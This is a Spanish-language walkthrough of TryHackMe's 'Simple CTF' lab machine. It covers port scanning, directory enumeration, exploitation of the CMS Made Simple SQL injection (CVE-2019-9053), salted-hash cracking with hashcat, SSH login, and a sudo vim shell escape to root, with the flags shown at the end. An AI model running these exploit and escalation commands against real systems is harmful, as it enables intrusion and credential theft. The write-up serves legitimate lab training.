# Simple CTF

Plataforma: TryHackMe
OS: Linux
Level: Easy
Status: Done
Complete: Yes
Created time: 4 de diciembre de 2024 21:53
IP: 10.10.186.87

## Notas

## Recopilación de información

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn <%IP%> -oG targeted

```

![imagenes/image.png](<imagenes/image.png>)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

- **Identificación de vulnerabilidades**
    - 21
    - 2222
    - 80
    

```bash
sudo nmap -sCV -p1,2,3 <%IP%> -oN nmap
sudo nmap -v -sV -O --script="safe and vuln" -T4 -n -Pn -p135,445 -oA nmap <%IP%>

```

![imagenes/image.png](<imagenes/image 1.png>)

Miramos la web y el contenido de robots.txt

![imagenes/image.png](<imagenes/image 2.png>)

Vemos que el directorio no esta visible
Probamos con gobuster

```bash
gobuster dir -u <http://10.10.186.89> -w /usr/share/wordlist/seclit/Discovery/Web-Content/directory-list-2.3-mediu.txt

Output:

/simple

```

![imagenes/image.png](<imagenes/image 3.png>)

## Explotación

### Explotación 1

Vulnerabilidad Potencial**: CVE-2019-9053
CMS Made Simple < 2.2.10 - SQL Injection

- **Exploit Disponibles**:
    
    ```bash
    searchsploit CMS Made simple 2.2.8
    Output:
    CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
    ```
    

NOTA: Ejecutamos el script. Para que funcione con python3, ha que poner con () todas las declaraciones print que van con “

```bash
python3 46635.py
```

![imagenes/image.png](<imagenes/image 4.png>)

```bash
+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

### Explotación 2

Probamos a desencriptar el hash

```bash
hashcat -m 20 -a 0 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlist/rockyou.txt
#
10 = md5($pass.$salt)
20 = md5($salt.$pass)

Output :
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```

### Explotación 3

Conectamos por ssh

```bash
ssh -p 2222 mitch@10.10.186.87

```

## Explotación posterior

### Escalada de privilegios

Accedemos como mitch

```bash
   sudo -l

   User mitch may run the following commands on Machine:
   (root) NOPASSWD: /usr/bin/vim
```

Buscamos el binario en GTFObins

```bash
Payload:
sudo vim -c ':!/bin/sh'

```

Probamos a obtener la shell: 

![imagenes/image.png](<imagenes/image 5.png>)

### Obtención de user.txt

- **Localización**:
    
    ```bash
    find / -name "user.txt"
    cat /path/to/user.txt
    Output: G00d j0b, keep up!
    ```
    

### Obtención de Root.txt

- **Localización**:
    
    ```bash
    find / -name "root.txt"
    cat /path/to/root.txt
    Output: W3ll d0n3. You made it!
    ```
    

## Conclusión